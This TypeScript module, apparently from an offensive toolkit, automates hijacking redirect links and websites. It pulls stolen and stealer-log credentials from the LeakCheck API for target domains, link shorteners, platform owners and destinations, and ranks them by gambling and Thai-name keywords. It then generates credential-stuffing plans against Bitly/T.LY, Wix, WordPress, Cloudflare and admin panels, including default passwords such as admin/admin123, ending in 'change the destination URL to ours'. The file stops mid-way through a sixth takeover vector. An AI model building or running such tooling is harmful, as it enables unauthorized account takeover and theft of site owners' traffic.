/**
 * Redirect Takeover Intelligence Module
 * 
 * วิเคราะห์ redirect chain อย่างละเอียดเพื่อหาวิธี takeover:
 * 1. Trace redirect chain ทั้งหมด (source → short URL → destination)
 * 2. ระบุ platform/CMS (Wix, WordPress, Shopify, etc.) จาก fingerprint
 * 3. ค้นหา credentials จาก LeakCheck (domain, origin, username, email)
 * 4. วิเคราะห์ short URL services (t.ly, bit.ly, etc.) + หา stealer credentials
 * 5. ดึง site metadata (Wix userId, metaSiteId, JWT tokens, etc.)
 * 6. สร้าง Telegram report แสดง attack vectors ทั้งหมด
 * 7. ให้คะแนน takeover probability สำหรับแต่ละ vector
 */
import { fetchWithPoolProxy, fetchWithThaiProxy } from "./proxy-pool";
import { ENV } from "./_core/env";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface TakeoverIntelConfig {
  domain: string;
  targetUrl?: string;
  /** Redirect chain from deep scan (if available) */
  redirectChain?: Array<{ url: string; statusCode: number; redirectType: string }>;
  /** Current redirect destination (if known) */
  currentDestination?: string | null;
  /** Max duration in ms */
  maxDurationMs?: number;
  /** Progress callback */
  onProgress?: (phase: string, detail: string) => void;
}

export interface ShortUrlAnalysis {
  service: string;           // t.ly, bit.ly, etc.
  shortUrl: string;
  destination: string | null;
  /** Stealer credentials found for this service */
  stealerCredentials: Array<{
    email: string;
    password: string;
    relevanceScore: number;
    relevanceReason: string;
  }>;
  /** Can we create account on this service? */
  canCreateAccount: boolean;
  /** Takeover difficulty */
  takeoverDifficulty: "easy" | "medium" | "hard" | "expert";
}

export interface PlatformAnalysis {
  platform: string;          // Wix, WordPress, Shopify, etc.
  confidence: number;        // 0-100
  /** Site owner identifiers extracted */
  ownerIdentifiers: Array<{
    type: string;            // userId, email, metaSiteId, etc.
    value: string;
  }>;
  /** Credentials found for platform login */
  platformCredentials: Array<{
    email: string;
    password: string;
    source: string;
    relevanceScore: number;
  }>;
  /** Known vulnerabilities for this platform */
  knownVulnerabilities: string[];
}

export interface TakeoverVector {
  id: string;
  name: string;
  description: string;
  /** Target: what we're trying to take over */
  target: string;
  /** Method: how to take over */
  method: string;
  /** Required: what we need */
  requirements: string[];
  /** Probability of success */
  successProbability: number;
  /** Difficulty level */
  difficulty: "easy" | "medium" | "hard" | "expert";
  /** Credentials to try (if any) */
  credentialsToTry: Array<{ email: string; password: string }>;
  /** Steps to execute */
  steps: string[];
}

export interface TakeoverIntelResult {
  domain: string;
  targetUrl: string | null;
  scanDuration: number;
  /** Full redirect chain analysis */
  redirectChain: Array<{
    url: string;
    statusCode: number;
    redirectType: string;
    platform: string | null;
    isShortUrl: boolean;
    domainAge: string | null;
  }>;
  /** Short URL analysis */
  shortUrls: ShortUrlAnalysis[];
  /** Platform/CMS analysis */
  platform: PlatformAnalysis | null;
  /** All discovered credentials (from all sources) */
  allCredentials: Array<{
    email: string;
    password: string;
    source: string;
    targetService: string;
    relevanceScore: number;
  }>;
  /** Ranked takeover vectors */
  takeoverVectors: TakeoverVector[];
  /** Top recommended vector */
  topVector: TakeoverVector | null;
  /** Summary for Telegram */
  summary: string;
}

// ═══════════════════════════════════════════════════════
//  SHORT URL SERVICES
// ═══════════════════════════════════════════════════════

const SHORT_URL_SERVICES: Record<string, { name: string; loginUrl: string; apiAvailable: boolean }> = {
  "t.ly": { name: "T.LY", loginUrl: "https://t.ly/login", apiAvailable: true },
  "bit.ly": { name: "Bitly", loginUrl: "https://bitly.com/a/sign_in", apiAvailable: true },
  "tinyurl.com": { name: "TinyURL", loginUrl: "https://tinyurl.com/app/login", apiAvailable: true },
  "is.gd": { name: "is.gd", loginUrl: "", apiAvailable: false },
  "v.gd": { name: "v.gd", loginUrl: "", apiAvailable: false },
  "rb.gy": { name: "Rebrandly", loginUrl: "https://app.rebrandly.com/login", apiAvailable: true },
  "ow.ly": { name: "Hootsuite", loginUrl: "https://hootsuite.com/login", apiAvailable: true },
  "cutt.ly": { name: "Cutt.ly", loginUrl: "https://cutt.ly/login", apiAvailable: true },
  "shorturl.at": { name: "ShortURL", loginUrl: "", apiAvailable: false },
  "s.id": { name: "S.id", loginUrl: "https://home.s.id/login", apiAvailable: true },
  "link.in.th": { name: "Link.in.th", loginUrl: "", apiAvailable: false },
};

// ═══════════════════════════════════════════════════════
//  PLATFORM FINGERPRINTS
// ═══════════════════════════════════════════════════════

interface PlatformFingerprint {
  name: string;
  patterns: RegExp[];
  headerPatterns?: Record<string, RegExp>;
  metadataExtractors: Array<{
    name: string;
    regex: RegExp;
    type: string;
  }>;
}

const PLATFORM_FINGERPRINTS: PlatformFingerprint[] = [
  {
    name: "Wix",
    patterns: [
      /wixstatic\.com/i,
      /wix\.com/i,
      /X-Wix-/i,
      /wixsite\.com/i,
      /_wix_browser_sess/i,
      /wix-code-sdk/i,
    ],
    headerPatterns: { "x-wix-request-id": /.*/, server: /Pepyaka/i },
    metadataExtractors: [
      { name: "siteOwnerId", regex: /siteOwnerId['":\s]+["']?([a-f0-9-]{36})/i, type: "userId" },
      { name: "metaSiteId", regex: /metaSiteId['":\s]+["']?([a-f0-9-]{36})/i, type: "metaSiteId" },
      { name: "siteId", regex: /"siteId"\s*:\s*"([a-f0-9-]{36})"/i, type: "siteId" },
      { name: "userId_prefix", regex: /([a-f0-9]{6})_[a-f0-9]{32}(?:-mv2)?/i, type: "userIdPrefix" },
      { name: "revision", regex: /"siteRevision"\s*:\s*(\d+)/i, type: "revision" },
    ],
  },
  {
    name: "WordPress",
    patterns: [
      /wp-content/i,
      /wp-includes/i,
      /wp-json/i,
      /wordpress/i,
      /xmlrpc\.php/i,
    ],
    metadataExtractors: [
      { name: "wpVersion", regex: /content="WordPress\s+([\d.]+)"/i, type: "version" },
      { name: "wpTheme", regex: /wp-content\/themes\/([^/"']+)/i, type: "theme" },
      { name: "wpGenerator", regex: /<meta\s+name="generator"\s+content="WordPress\s+([\d.]+)"/i, type: "version" },
    ],
  },
  {
    name: "Shopify",
    patterns: [
      /cdn\.shopify\.com/i,
      /Shopify\.theme/i,
      /myshopify\.com/i,
    ],
    metadataExtractors: [
      { name: "shopId", regex: /Shopify\.shop\s*=\s*["']([^"']+)/i, type: "shopId" },
    ],
  },
  {
    name: "Squarespace",
    patterns: [
      /squarespace\.com/i,
      /static1\.squarespace\.com/i,
      /sqsp\.net/i,
    ],
    metadataExtractors: [],
  },
  {
    name: "Webflow",
    patterns: [
      /webflow\.com/i,
      /assets\.website-files\.com/i,
    ],
    metadataExtractors: [],
  },
  {
    name: "Joomla",
    patterns: [
      /\/administrator\//i,
      /Joomla!/i,
      /\/media\/jui\//i,
    ],
    metadataExtractors: [
      { name: "joomlaVersion", regex: /<meta\s+name="generator"\s+content="Joomla!\s+([\d.]+)"/i, type: "version" },
    ],
  },
  {
    name: "Drupal",
    patterns: [
      /\/sites\/default\/files/i,
      /Drupal/i,
      /drupal\.js/i,
    ],
    metadataExtractors: [],
  },
];

// ═══════════════════════════════════════════════════════
//  GAMBLING KEYWORDS
// ═══════════════════════════════════════════════════════

const GAMBLING_KEYWORDS = [
  "pgwin", "pg828", "fafa828", "sawa88", "slot", "casino", "สล็อต", "บาคาร่า",
  "เว็บตรง", "ทางเข้า", "สมัคร", "ฝากถอน", "เครดิตฟรี", "แจกเครดิต",
  "betflix", "joker", "pgslot", "superslot", "ambbet", "ufa", "sa gaming",
  "sexy baccarat", "dream gaming", "allbet", "evolution gaming",
  "PGWIN828", "pgwin828", "PG828", "pg828",
];

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function extractDomain(url: string): string {
  try { return new URL(url).hostname; } catch { return url; }
}

function isShortUrlService(url: string): { isShort: boolean; service: string | null } {
  const hostname = extractDomain(url).replace(/^www\./, "");
  for (const [domain, info] of Object.entries(SHORT_URL_SERVICES)) {
    if (hostname === domain || hostname.endsWith(`.${domain}`)) {
      return { isShort: true, service: info.name };
    }
  }
  // Check for common short URL patterns (short domain + short path)
  const parts = hostname.split(".");
  if (parts.length <= 2 && hostname.length <= 10) {
    try {
      const path = new URL(url).pathname;
      if (path.length <= 12 && path.length >= 2) {
        return { isShort: true, service: hostname };
      }
    } catch { /* ignore */ }
  }
  return { isShort: false, service: null };
}

async function leakCheckSearch(
  query: string,
  type: "domain" | "origin" | "email" | "username",
  limit = 200
): Promise<Array<{ email: string; password: string; source: string; breachDate?: string }>> {
  const apiKey = ENV.leakcheckApiKey;
  if (!apiKey) return [];
  
  try {
    const { response } = await fetchWithPoolProxy(
      `https://leakcheck.io/api/v2/query/${encodeURIComponent(query)}?type=${type}&limit=${limit}`,
      {
        headers: { "X-API-Key": apiKey, "Accept": "application/json" },
      },
      { targetDomain: "leakcheck.io", timeout: 15000 }
    );
    
    if (!response.ok) return [];
    const data = await response.json() as any;
    if (!data.success || !data.result) return [];
    
    return data.result
      .filter((r: any) => r.password && (r.email || r.username))
      .map((r: any) => ({
        email: r.email || r.username || "",
        password: r.password,
        source: r.source?.name || "Stealer Logs",
        breachDate: r.source?.breach_date,
      }));
  } catch {
    return [];
  }
}

function scoreCredentialRelevance(
  cred: { email: string; password: string },
  domain: string,
  keywords: string[]
): { score: number; reason: string } {
  const email = cred.email.toLowerCase();
  const pw = cred.password.toLowerCase();
  let score = 0;
  const reasons: string[] = [];
  
  // Domain match
  if (email.includes(domain.split(".")[0])) { score += 20; reasons.push("domain in email"); }
  
  // Thai indicators
  if (/^0[689]\d{8}$/.test(cred.email)) { score += 15; reasons.push("Thai phone number"); }
  if (/^[689]\d{8}$/.test(cred.email)) { score += 15; reasons.push("Thai phone (no 0)"); }
  
  // Gambling keywords
  for (const kw of keywords) {
    if (email.includes(kw.toLowerCase())) { score += 10; reasons.push(`"${kw}" in email`); break; }
    if (pw.includes(kw.toLowerCase())) { score += 5; reasons.push(`"${kw}" in password`); break; }
  }
  
  // SEO/spam indicators
  if (email.includes("seo") || email.includes("spam") || email.includes("backlink")) {
    score += 10; reasons.push("SEO-related email");
  }
  
  // Thai name patterns
  const thaiNamePatterns = ["thai", "siam", "bkk", "bangkok", "krung", "somchai", "natawat", "kasem", "boat"];
  for (const p of thaiNamePatterns) {
    if (email.includes(p)) { score += 8; reasons.push(`Thai name "${p}"`); break; }
  }
  
  return { score, reason: reasons.join(", ") || "generic" };
}

// ═══════════════════════════════════════════════════════
//  MAIN ANALYSIS FUNCTION
// ═══════════════════════════════════════════════════════

export async function runTakeoverIntel(config: TakeoverIntelConfig): Promise<TakeoverIntelResult> {
  const startTime = Date.now();
  const maxDuration = config.maxDurationMs || 120_000; // 2 min default
  const progress = config.onProgress || (() => {});
  
  const result: TakeoverIntelResult = {
    domain: config.domain,
    targetUrl: config.targetUrl || null,
    scanDuration: 0,
    redirectChain: [],
    shortUrls: [],
    platform: null,
    allCredentials: [],
    takeoverVectors: [],
    topVector: null,
    summary: "",
  };
  
  const isTimedOut = () => Date.now() - startTime > maxDuration;
  
  // ─── Step 1: Trace redirect chain ───
  progress("redirect_chain", "🔗 Tracing redirect chain...");
  
  if (config.redirectChain && config.redirectChain.length > 0) {
    // Use pre-existing chain from deep scan
    for (const hop of config.redirectChain) {
      const shortCheck = isShortUrlService(hop.url);
      result.redirectChain.push({
        url: hop.url,
        statusCode: hop.statusCode,
        redirectType: hop.redirectType,
        platform: null,
        isShortUrl: shortCheck.isShort,
        domainAge: null,
      });
    }
  } else {
    // Trace chain ourselves
    try {
      const url = config.targetUrl || `https://${config.domain}`;
      const chain = await traceRedirectChain(url);
      result.redirectChain = chain;
    } catch (e) {
      progress("redirect_chain", `⚠️ Chain trace failed: ${(e as Error).message}`);
    }
  }
  
  // ─── Step 2: Identify short URLs in chain ───
  progress("short_url", "🔗 Analyzing short URLs in chain...");
  
  for (const hop of result.redirectChain) {
    if (hop.isShortUrl) {
      const shortAnalysis = await analyzeShortUrl(hop.url, config.domain);
      result.shortUrls.push(shortAnalysis);
    }
  }
  
  if (isTimedOut()) { result.scanDuration = Date.now() - startTime; return finalize(result); }
  
  // ─── Step 3: Detect platform/CMS ───
  progress("platform", "🏗️ Detecting platform/CMS...");
  
  try {
    const platformResult = await detectPlatform(config.domain, config.targetUrl);
    result.platform = platformResult;
  } catch (e) {
    progress("platform", `⚠️ Platform detection failed: ${(e as Error).message}`);
  }
  
  if (isTimedOut()) { result.scanDuration = Date.now() - startTime; return finalize(result); }
  
  // ─── Step 4: Credential search ───
  progress("credentials", "🔑 Searching credentials...");
  
  // 4a. Search domain credentials
  const domainCreds = await leakCheckSearch(config.domain, "domain");
  for (const c of domainCreds) {
    result.allCredentials.push({
      ...c, targetService: "domain_login", relevanceScore: 0,
    });
  }
  
  // 4b. Search stealer logs for domain
  const stealerCreds = await leakCheckSearch(config.domain, "origin");
  for (const c of stealerCreds) {
    const isDupe = result.allCredentials.some(x => x.email === c.email && x.password === c.password);
    if (!isDupe) {
      result.allCredentials.push({
        ...c, targetService: "stealer_logs", relevanceScore: 0,
      });
    }
  }
  
  // 4c. Search short URL service credentials
  for (const shortUrl of result.shortUrls) {
    const serviceDomain = extractDomain(shortUrl.shortUrl);
    const serviceCreds = await leakCheckSearch(serviceDomain, "origin", 999);
    shortUrl.stealerCredentials = [];
    
    for (const c of serviceCreds) {
      const { score, reason } = scoreCredentialRelevance(c, config.domain, GAMBLING_KEYWORDS);
      if (score > 0) {
        shortUrl.stealerCredentials.push({
          email: c.email,
          password: c.password,
          relevanceScore: score,
          relevanceReason: reason,
        });
      }
      // Also add to allCredentials
      const isDupe = result.allCredentials.some(x => x.email === c.email && x.password === c.password);
      if (!isDupe) {
        result.allCredentials.push({
          email: c.email,
          password: c.password,
          source: c.source,
          targetService: shortUrl.service,
          relevanceScore: score,
        });
      }
    }
    
    // Sort by relevance
    shortUrl.stealerCredentials.sort((a, b) => b.relevanceScore - a.relevanceScore);
  }
  
  if (isTimedOut()) { result.scanDuration = Date.now() - startTime; return finalize(result); }
  
  // 4d. Search platform credentials
  if (result.platform) {
    progress("credentials", `🔑 Searching ${result.platform.platform} credentials...`);
    
    // Search for platform stealer logs
    const platformDomain = result.platform.platform.toLowerCase() + ".com";
    const platformCreds = await leakCheckSearch(platformDomain, "origin", 200);
    
    // Filter for domain-related
    for (const c of platformCreds) {
      const { score, reason } = scoreCredentialRelevance(c, config.domain, GAMBLING_KEYWORDS);
      if (score > 0) {
        result.platform.platformCredentials.push({
          email: c.email,
          password: c.password,
          source: c.source,
          relevanceScore: score,
        });
      }
    }
    result.platform.platformCredentials.sort((a, b) => b.relevanceScore - a.relevanceScore);
    
    // Search owner identifiers
    for (const ownerId of result.platform.ownerIdentifiers) {
      if (ownerId.type === "userId" || ownerId.type === "email") {
        const ownerCreds = await leakCheckSearch(ownerId.value, ownerId.type === "email" ? "email" : "username");
        for (const c of ownerCreds) {
          const isDupe = result.allCredentials.some(x => x.email === c.email && x.password === c.password);
          if (!isDupe) {
            result.allCredentials.push({
              ...c,
              targetService: `${result.platform!.platform}_owner`,
              relevanceScore: 50, // High relevance — owner's credentials
            });
          }
        }
      }
    }
  }
  
  // 4e. Search destination domain credentials
  if (config.currentDestination) {
    const destDomain = extractDomain(config.currentDestination);
    progress("credentials", `🔑 Searching ${destDomain} credentials...`);
    const destCreds = await leakCheckSearch(destDomain, "origin", 200);
    for (const c of destCreds) {
      const isDupe = result.allCredentials.some(x => x.email === c.email && x.password === c.password);
      if (!isDupe) {
        result.allCredentials.push({
          ...c, targetService: `destination_${destDomain}`, relevanceScore: 0,
        });
      }
    }
  }
  
  // Score all credentials
  for (const c of result.allCredentials) {
    if (c.relevanceScore === 0) {
      const { score } = scoreCredentialRelevance(c, config.domain, GAMBLING_KEYWORDS);
      c.relevanceScore = score;
    }
  }
  result.allCredentials.sort((a, b) => b.relevanceScore - a.relevanceScore);
  
  // ─── Step 5: Build takeover vectors ───
  progress("vectors", "🎯 Building takeover vectors...");
  result.takeoverVectors = buildTakeoverVectors(result);
  result.takeoverVectors.sort((a, b) => b.successProbability - a.successProbability);
  result.topVector = result.takeoverVectors[0] || null;
  
  result.scanDuration = Date.now() - startTime;
  return finalize(result);
}

// ═══════════════════════════════════════════════════════
//  REDIRECT CHAIN TRACER
// ═══════════════════════════════════════════════════════

async function traceRedirectChain(url: string): Promise<TakeoverIntelResult["redirectChain"]> {
  const chain: TakeoverIntelResult["redirectChain"] = [];
  let currentUrl = url;
  const visited = new Set<string>();
  
  for (let i = 0; i < 15; i++) {
    if (visited.has(currentUrl)) break;
    visited.add(currentUrl);
    
    try {
      const { response } = await fetchWithPoolProxy(currentUrl, {
        redirect: "manual",
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        },
      }, { targetDomain: extractDomain(currentUrl), timeout: 10000 });
      
      const shortCheck = isShortUrlService(currentUrl);
      const statusCode = response.status;
      let redirectType = "none";
      
      if ([301, 302, 307, 308].includes(statusCode)) {
        redirectType = String(statusCode);
        const location = response.headers.get("location");
        chain.push({
          url: currentUrl,
          statusCode,
          redirectType,
          platform: null,
          isShortUrl: shortCheck.isShort,
          domainAge: null,
        });
        if (location) {
          currentUrl = location.startsWith("http") ? location : new URL(location, currentUrl).href;
        } else break;
      } else {
        // Check for meta refresh or JS redirect
        const body = await response.text();
        const metaRefresh = body.match(/<meta[^>]*http-equiv=["']refresh["'][^>]*content=["']\d+;\s*url=([^"']+)/i);
        const jsRedirect = body.match(/(?:window\.)?location(?:\.href)?\s*=\s*["']([^"']+)/i);
        
        if (metaRefresh) {
          redirectType = "meta";
          chain.push({ url: currentUrl, statusCode, redirectType, platform: null, isShortUrl: shortCheck.isShort, domainAge: null });
          currentUrl = metaRefresh[1].startsWith("http") ? metaRefresh[1] : new URL(metaRefresh[1], currentUrl).href;
        } else if (jsRedirect) {
          redirectType = "js";
          chain.push({ url: currentUrl, statusCode, redirectType, platform: null, isShortUrl: shortCheck.isShort, domainAge: null });
          currentUrl = jsRedirect[1].startsWith("http") ? jsRedirect[1] : new URL(jsRedirect[1], currentUrl).href;
        } else {
          // Final destination
          chain.push({ url: currentUrl, statusCode, redirectType: "none", platform: null, isShortUrl: shortCheck.isShort, domainAge: null });
          break;
        }
      }
    } catch {
      chain.push({ url: currentUrl, statusCode: 0, redirectType: "error", platform: null, isShortUrl: false, domainAge: null });
      break;
    }
  }
  
  return chain;
}

// ═══════════════════════════════════════════════════════
//  SHORT URL ANALYZER
// ═══════════════════════════════════════════════════════

async function analyzeShortUrl(shortUrl: string, targetDomain: string): Promise<ShortUrlAnalysis> {
  const hostname = extractDomain(shortUrl).replace(/^www\./, "");
  const serviceInfo = SHORT_URL_SERVICES[hostname];
  
  const analysis: ShortUrlAnalysis = {
    service: serviceInfo?.name || hostname,
    shortUrl,
    destination: null,
    stealerCredentials: [],
    canCreateAccount: serviceInfo?.apiAvailable || false,
    takeoverDifficulty: "hard",
  };
  
  // Try to resolve short URL destination
  try {
    const { response } = await fetchWithPoolProxy(shortUrl, {
      redirect: "manual",
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
    }, { targetDomain: hostname, timeout: 10000 });
    
    if ([301, 302, 307, 308].includes(response.status)) {
      analysis.destination = response.headers.get("location");
    }
  } catch { /* ignore */ }
  
  // Search stealer logs for this short URL service
  const serviceCreds = await leakCheckSearch(hostname, "origin", 999);
  
  for (const c of serviceCreds) {
    const { score, reason } = scoreCredentialRelevance(c, targetDomain, GAMBLING_KEYWORDS);
    analysis.stealerCredentials.push({
      email: c.email,
      password: c.password,
      relevanceScore: score,
      relevanceReason: reason || "generic t.ly user",
    });
  }
  
  // Sort by relevance
  analysis.stealerCredentials.sort((a, b) => b.relevanceScore - a.relevanceScore);
  
  // Determine takeover difficulty
  if (analysis.stealerCredentials.some(c => c.relevanceScore >= 15)) {
    analysis.takeoverDifficulty = "medium";
  } else if (analysis.stealerCredentials.some(c => c.relevanceScore >= 5)) {
    analysis.takeoverDifficulty = "hard";
  } else {
    analysis.takeoverDifficulty = analysis.stealerCredentials.length > 0 ? "hard" : "expert";
  }
  
  return analysis;
}

// ═══════════════════════════════════════════════════════
//  PLATFORM DETECTOR
// ═══════════════════════════════════════════════════════

async function detectPlatform(domain: string, targetUrl?: string): Promise<PlatformAnalysis | null> {
  const url = targetUrl || `https://${domain}`;
  
  try {
    const { response } = await fetchWithPoolProxy(url, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html",
      },
      redirect: "follow",
    }, { targetDomain: domain, timeout: 15000 });
    
    const html = await response.text();
    const headers = Object.fromEntries(response.headers.entries());
    
    for (const fp of PLATFORM_FINGERPRINTS) {
      let matchCount = 0;
      for (const pattern of fp.patterns) {
        if (pattern.test(html)) matchCount++;
      }
      // Check headers
      if (fp.headerPatterns) {
        for (const [header, pattern] of Object.entries(fp.headerPatterns)) {
          if (headers[header] && pattern.test(headers[header])) matchCount++;
        }
      }
      
      if (matchCount >= 2) {
        const confidence = Math.min(100, matchCount * 25);
        const ownerIdentifiers: PlatformAnalysis["ownerIdentifiers"] = [];
        
        // Extract metadata
        for (const extractor of fp.metadataExtractors) {
          const match = html.match(extractor.regex);
          if (match) {
            ownerIdentifiers.push({ type: extractor.type, value: match[1] });
          }
        }
        
        // Known vulnerabilities per platform
        const knownVulns: string[] = [];
        if (fp.name === "Wix") {
          knownVulns.push(
            "Wix Editor access via stolen credentials",
            "Wix App Market injection (third-party apps)",
            "Wix SEO settings manipulation",
            "Wix custom code injection (Velo/Corvid)",
          );
        } else if (fp.name === "WordPress") {
          knownVulns.push(
            "XMLRPC brute force",
            "REST API user enumeration",
            "Plugin/theme editor (wp-admin)",
            "WP-CLI remote execution",
            "Database injection via PHPMyAdmin",
          );
        }
        
        return {
          platform: fp.name,
          confidence,
          ownerIdentifiers,
          platformCredentials: [],
          knownVulnerabilities: knownVulns,
        };
      }
    }
    
    return null;
  } catch {
    return null;
  }
}

// ═══════════════════════════════════════════════════════
//  TAKEOVER VECTOR BUILDER
// ═══════════════════════════════════════════════════════

function buildTakeoverVectors(result: TakeoverIntelResult): TakeoverVector[] {
  const vectors: TakeoverVector[] = [];
  
  // Vector 1: Short URL account takeover
  for (const shortUrl of result.shortUrls) {
    if (shortUrl.stealerCredentials.length > 0) {
      const topCreds = shortUrl.stealerCredentials.filter(c => c.relevanceScore >= 5).slice(0, 10);
      const probability = topCreds.length > 0
        ? Math.min(60, 15 + topCreds[0].relevanceScore * 2)
        : 10;
      
      vectors.push({
        id: `short_url_takeover_${shortUrl.service}`,
        name: `${shortUrl.service} Account Takeover`,
        description: `Login เข้า ${shortUrl.service} ด้วย credentials จาก stealer logs แล้วเปลี่ยน destination URL`,
        target: shortUrl.shortUrl,
        method: "credential_stuffing",
        requirements: [
          `${shortUrl.service} account credentials`,
          "Bypass Cloudflare (manual captcha)",
        ],
        successProbability: probability,
        difficulty: shortUrl.takeoverDifficulty,
        credentialsToTry: topCreds.map(c => ({ email: c.email, password: c.password })),
        steps: [
          `เปิด ${shortUrl.service} login page`,
          "ผ่าน Cloudflare captcha",
          `ลอง login ด้วย ${topCreds.length} credentials (เรียงตาม relevance)`,
          "ถ้า login สำเร็จ → หา link pgw828 ใน dashboard",
          "เปลี่ยน destination URL เป็นของเรา",
        ],
      });
    }
  }
  
  // Vector 2: Platform account takeover (Wix, WordPress, etc.)
  if (result.platform) {
    const platformCreds = result.platform.platformCredentials.filter(c => c.relevanceScore >= 5);
    const ownerCreds = result.allCredentials.filter(c => c.targetService.includes("_owner"));
    const allPlatformCreds = [...ownerCreds, ...platformCreds.map(c => ({ ...c, targetService: result.platform!.platform }))];
    
    if (allPlatformCreds.length > 0 || result.platform.knownVulnerabilities.length > 0) {
      const probability = ownerCreds.length > 0
        ? Math.min(70, 30 + ownerCreds[0].relevanceScore)
        : platformCreds.length > 0
          ? Math.min(50, 15 + platformCreds[0].relevanceScore)
          : 10;
      
      vectors.push({
        id: `platform_takeover_${result.platform.platform.toLowerCase()}`,
        name: `${result.platform.platform} Account Takeover`,
        description: `เข้า ${result.platform.platform} editor/admin ด้วย credentials แล้วเปลี่ยน redirect link`,
        target: `${result.platform.platform} site: ${result.domain}`,
        method: "platform_login",
        requirements: [
          `${result.platform.platform} account credentials`,
          ...result.platform.knownVulnerabilities.slice(0, 3),
        ],
        successProbability: probability,
        difficulty: ownerCreds.length > 0 ? "medium" : "hard",
        credentialsToTry: allPlatformCreds.slice(0, 10).map(c => ({ email: c.email, password: c.password })),
        steps: [
          `เปิด ${result.platform.platform} login page`,
          `ลอง login ด้วย ${allPlatformCreds.length} credentials`,
          "ถ้า login สำเร็จ → เข้า site editor",
          "หา redirect link/code ที่ฝังอยู่",
          "เปลี่ยน destination URL เป็นของเรา",
        ],
      });
    }
  }
  
  // Vector 3: Domain credential takeover (direct site login)
  const domainCreds = result.allCredentials.filter(c =>
    c.targetService === "domain_login" || c.targetService === "stealer_logs"
  );
  if (domainCreds.length > 0) {
    vectors.push({
      id: "domain_credential_takeover",
      name: "Direct Site Credential Attack",
      description: `ใช้ credentials จาก breach databases เข้า admin panel ของ ${result.domain}`,
      target: `${result.domain} admin panel`,
      method: "credential_stuffing",
      requirements: ["Admin panel URL", "Valid credentials"],
      successProbability: Math.min(50, 10 + domainCreds.length * 2),
      difficulty: "medium",
      credentialsToTry: domainCreds.slice(0, 20).map(c => ({ email: c.email, password: c.password })),
      steps: [
        `ค้นหา admin panel URL (wp-admin, /admin, etc.)`,
        `ลอง login ด้วย ${domainCreds.length} credentials`,
        "ถ้า login สำเร็จ → วาง redirect code",
      ],
    });
  }
  
  // Vector 4: Cloudflare Account Takeover (when CF is detected as DNS/CDN provider)
  const isCloudflareSite = result.redirectChain.some(r => 
    r.platform?.toLowerCase().includes("cloudflare") || r.redirectType === "302" || r.redirectType === "301"
  ) || result.platform?.platform === "Cloudflare";
  
  // Check if redirect is server-side (302/301 with empty body = CF Page Rule)
  const isServerSideRedirect = result.redirectChain.some(r => 
    (r.statusCode === 301 || r.statusCode === 302) && r.redirectType !== "javascript" && r.redirectType !== "meta"
  );
  
  if (isServerSideRedirect) {
    // Collect all credentials that could be CF accounts
    // Include domain owner creds, stealer logs, and any email-based creds
    const cfCandidateCreds = result.allCredentials
      .filter(c => c.email && c.password)
      .sort((a, b) => b.relevanceScore - a.relevanceScore)
      .slice(0, 30);
    
    if (cfCandidateCreds.length > 0) {
      const probability = Math.min(45, 5 + cfCandidateCreds.length);
      vectors.push({
        id: "cloudflare_takeover",
        name: "Cloudflare Account Takeover",
        description: `Login Cloudflare API ด้วย credentials จาก breach data → หา zone ${result.domain} → แก้ Page Rule/Redirect Rule`,
        target: `Cloudflare: ${result.domain}`,
        method: "credential_stuffing",
        requirements: [
          "Cloudflare Global API Key or API Token",
          `Zone access for ${result.domain}`,
          "Page Rule or Redirect Rule edit permission",
        ],
        successProbability: probability,
        difficulty: "hard",
        credentialsToTry: cfCandidateCreds.map(c => ({ email: c.email, password: c.password })),
        steps: [
          "ลอง login CF API ด้วย password เป็น Global API Key",
          "ลอง password เป็น API Token (Bearer)",
          `ถ้า login สำเร็จ → List zones → หา ${result.domain}`,
          "หา Page Rules + Redirect Rules ที่ match path",
          "เปลี่ยน destination URL เป็นของเรา",
        ],
      });
    }
  }
  
  // Vector 5: Destination domain takeover
  const destCreds = result.allCredentials.filter(c => c.targetService.startsWith("destination_"));
  if (destCreds.length > 0) {
    vectors.push({
      id: "destination_takeover",
      name: "Destination Domain Takeover",
      description: `เข้าถึง destination domain โดยตรงแล้วเปลี่ยนเนื้อหา`,
      target: `Destination: ${result.redirectChain[result.redirectChain.length - 1]?.url || "unknown"}`,
      method: "credential_stuffing",
      requirements: ["Destination site credentials"],
      successProbability: Math.min(40, 5 + destCreds.length),
      difficulty: "hard",
      credentialsToTry: destCreds.slice(0, 10).map(c => ({ email: c.email, password: c.password })),
      steps: [
        "Login เข้า destination site admin",
        "เปลี่ยนเนื้อหาเป็นของเรา",
      ],
    });
  }
  
  // Vector 6: Robot Management System (RMS) Takeover
  // Detect when destination is a gambling site that might be managed by an RMS panel
  const lastHop = result.redirectChain[result.redirectChain.length - 1];
  const destUrl = lastHop?.url || "";
  const destDomain = extractDomain(destUrl);
  
  // Check for gambling/lottery indicators in the destination
  const gamblingIndicators = [
    "casino", "slot", "bet", "poker", "lottery", "lotto", "หวย", "สล็อต", 
    "คาสิโน", "บาคาร่า", "แทงบอล", "พนัน", "bonus", "bigwin", "jackpot",
    "teeyai", "เที่ยวไป", "xn--", // IDN domains (common for Thai gambling)
  ];
  
  const isGamblingDest = gamblingIndicators.some(kw => 
    destUrl.toLowerCase().includes(kw) || destDomain.toLowerCase().includes(kw)
  );
  
  // Also check if destination uses IDN (punycode) — common for Thai gambling sites
  const isIdnDomain = destDomain.startsWith("xn--");
  
  if (isGamblingDest || isIdnDomain) {
    // RMS panels often use default credentials — high probability if gambling site
    const rmsCreds = [
      { email: "admin", password: "admin123" },
      { email: "admin", password: "admin" },
      { email: "root", password: "root123" },
      ...result.allCredentials
        .filter(c => c.targetService.startsWith("destination_"))
        .slice(0, 5)
        .map(c => ({ email: c.email, password: c.password })),
    ];
    
    vectors.push({
      id: "rms_takeover",
      name: "Robot Management System Takeover",
      description: `ค้นหา admin panel (port 8080/8888) ที่ควบคุมเว็บ ${destDomain} → login ด้วย default credentials → เปลี่ยน domain + redirect`,
      target: `RMS: ${destDomain}`,
      method: "rms_default_creds",
      requirements: [
        "RMS admin panel accessible (port 8080/8888)",
        "Default credentials (admin/admin123)",
        "JWT authentication",
      ],
